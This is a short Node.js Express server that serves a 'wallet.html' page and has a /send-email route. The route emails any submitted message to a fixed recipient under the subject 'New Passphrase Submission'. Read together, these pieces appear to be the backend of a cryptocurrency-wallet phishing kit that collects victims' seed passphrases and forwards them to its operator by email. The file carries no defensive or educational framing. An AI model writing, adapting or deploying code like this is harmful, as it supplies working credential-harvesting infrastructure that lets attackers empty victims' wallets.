require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 2020;

// Load credentials securely from .env
const serviceEmail = process.env.SERVICE_EMAIL;
const servicePassword = process.env.SERVICE_PASSWORD;
const recipientEmail = process.env.RECIPIENT_EMAIL;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public")); // ✅ Serve frontend files

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: serviceEmail,
    pass: servicePassword,
  },
});

// Email sending route
app.post("/send-email", (req, res) => {
  const { message } = req.body;

  if (!message) {
    return res.status(400).json({ error: "Message field is required." });
  }

  const mailOptions = {
    from: serviceEmail,
    to: recipientEmail,
    subject: "New Passphrase Submission",
    text: message,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.status(500).json({ error: "Email sending failed." });
    } else {
      res.json({ success: "Email sent successfully!" });
    }
  });
});

// ✅ Serve the frontend index.html file
app.get("/wallet.html", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "wallet.html"));
});

// Start server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
